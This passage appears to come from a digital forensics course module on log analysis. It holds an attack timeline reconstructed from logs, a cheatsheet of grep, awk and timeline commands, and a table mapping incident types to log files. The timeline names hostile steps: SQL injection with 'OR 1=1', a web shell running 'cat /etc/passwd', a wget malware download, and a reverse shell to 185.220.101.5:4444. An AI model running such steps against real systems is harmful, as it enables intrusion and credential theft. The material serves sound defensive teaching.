┌─────────────────────────────────────────────────────────────────────────────────┐
│              ATTACK TIMELINE — April 1, 2026                                   │
├──────────┬────────────────────────────────────────────────────────────────────┤
│ TIME     │ EVENT                                              SOURCE LOG        │
├──────────┼────────────────────────────────────────────────────────────────────┤
│ 02:00:01 │ Port scan from 185.220.101.5 (23 ports/sec)       ufw.log           │
│ 02:50:00 │ sqlmap User-Agent detected against login.php       apache/access.log │
│ 02:55:44 │ SQL Injection: OR 1=1 payload sent                 apache/access.log │
│ 02:56:20 │ LFI: /etc/passwd successfully read (HTTP 200)      apache/access.log │
│ 02:57:10 │ Web shell (shell.php) uploaded via POST            apache/access.log │
│ 02:57:20 │ Web shell executed: id, whoami, cat /etc/passwd    apache/access.log │
│ 02:58:00 │ Malware downloaded via web shell (wget)            apache/access.log │
│ 03:00:01 │ Cron reverse shell installed, first beacon out     cron.log + ufw    │
│ 03:15:22 │ Attacker tools installed: nmap, netcat, john       dpkg.log          │
│ 03:45:00 │ SSH brute force begins against admin account       auth.log          │
│ 03:47:13 │ SSH login successful: admin from 185.220.101.5     auth.log          │
│ 03:48:03 │ Backdoor user created + added to sudo              auth.log          │
│ 03:49:10 │ Active outbound C2 to 185.220.101.5:4444           ufw.log           │
│ 03:52:05 │ Backdoor user logs in via SSH                      auth.log          │
│ 04:00:00 │ /etc/shadow accessed (credential dump)             syslog            │
└──────────┴────────────────────────────────────────────────────────────────────┘
```

---

## Tools Cheatsheet

> [!info] 🛠️ Essential Tools

```bash
# ─── TEXT PROCESSING ──────────────────────────────────
grep "pattern" file.log                    # search for pattern
grep -i "pattern" file.log                 # case insensitive
grep -E "pattern1|pattern2" file.log       # multiple patterns (regex)
grep -v "pattern" file.log                 # exclude pattern
grep -C 3 "pattern" file.log               # show 3 lines context

awk '{print $1, $5, $9}' file.log          # print specific columns
awk '{print $11}' auth.log | sort | uniq -c | sort -rn  # top IPs

sed 's/\[//g; s/\]//g' access.log         # remove brackets
cut -d' ' -f1,4,7 access.log              # cut specific fields

# ─── COUNTING & SORTING ───────────────────────────────
sort | uniq -c | sort -rn | head -20       # top N unique values
wc -l file.log                             # count lines

# ─── TIME FILTERING ───────────────────────────────────
grep "Apr  1 03:" auth.log                 # specific hour
grep "02/Apr/2026:03" access.log           # Apache format

# ─── BINARY LOGS ──────────────────────────────────────
last -F                                    # full login history
lastb                                      # failed logins
lastlog                                    # last login per user

# ─── LIVE SYSTEM ──────────────────────────────────────
who                                        # current users
w                                          # current users + activity
ps aux                                     # running processes
netstat -tulnp                             # open ports + processes
ss -tulnp                                  # modern netstat
lsof -i                                    # open network files

# ─── TIMELINE TOOLS ───────────────────────────────────
log2timeline.py timeline.plaso /var/log/   # create timeline
psort.py -o l2tcsv timeline.plaso > t.csv  # export timeline
cat *.log | sort -k1,3                     # manual merge+sort

# ─── WEB LOG ANALYSIS ─────────────────────────────────
goaccess access.log --log-format=COMBINED  # visual web log analyzer

# ─── WINDOWS TOOLS ────────────────────────────────────
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}
EvtxECmd.exe -f Security.evtx --csv output.csv
chainsaw hunt evtx_logs/ --rules sigma/
```

---

## Quick Reference Table

```
┌─────────────────────────────────┬──────────────────────────────────────────────┐
│ INCIDENT                        │ LOG FILE(S) TO CHECK                         │
├─────────────────────────────────┼──────────────────────────────────────────────┤
│ SSH Brute Force                 │ auth.log → grep "Failed password"            │
│ Successful Unauthorized Login   │ auth.log → grep "Accepted" / wtmp            │
│ After-hours Login               │ auth.log + last -F (filter time)             │
│ Privilege Escalation            │ auth.log (sudo) / Security.evtx 4672         │
│ Backdoor Account Created        │ auth.log (useradd) / Security.evtx 4720      │
│ Added to Admin Group            │ auth.log (usermod) / Security.evtx 4732      │
│ Web Attack (SQLi/XSS/LFI)       │ apache2/access.log                           │
│ Web Shell Upload+Exec           │ apache2/access.log + error.log               │
│ Scanner Detected                │ apache2/access.log (User-Agent)              │
│ Reverse Shell / C2 Beacon       │ ufw.log (ALLOW OUT) + cron.log               │
│ Attacker Tools Installed        │ dpkg.log / yum.log                           │
│ Port Scan                       │ ufw.log (BLOCK, many DPTs in 1 sec)          │
│ Data Exfiltration               │ ufw.log (high volume OUT to single IP)        │
│ Cron Persistence                │ cron.log / syslog (CRON CMD)                 │
│ Reboot Persistence              │ /etc/cron.d/ + /etc/rc.local                 │
│ USB Device Inserted             │ syslog (usb-storage) / kern.log              │
│ Rootkit/Kernel Module           │ kern.log (module loaded)                     │
│ Attacker Commands               │ .bash_history + Sysmon Event 1               │
│ DB Injection                    │ mysql/error.log + mysql.log                  │
│ Pass-the-Hash                   │ Security.evtx 4648, 4776                     │
│ Kerberoasting                   │ Security.evtx 4769 (RC4 = 0x17)             │
│ PowerShell Malware              │ PowerShell/Operational 4104                  │
│ Process Injection               │ Sysmon Event 8                               │
│ Credential Dumping              │ Security.evtx 4688 (mimikatz) + PS/Op 4104   │
│ Service Stopped (AV killed)     │ System.evtx 7036 / 7040                      │
└─────────────────────────────────┴──────────────────────────────────────────────┘
```

---

> [!success] ✅ Chain of Custody Checklist
> - [ ] Copied original logs before analysis
> - [ ] Hashed all original files (SHA256)
> - [ ] Documented all tools used
> - [ ] Recorded investigator name + timestamps
> - [ ] Never modified originals
> - [ ] All findings timestamped and sourced

---

*Cywarx — Unit IV: Digital Forensics | Log Analysis Module*
*Author: HeXx | Brand: Cywarx*
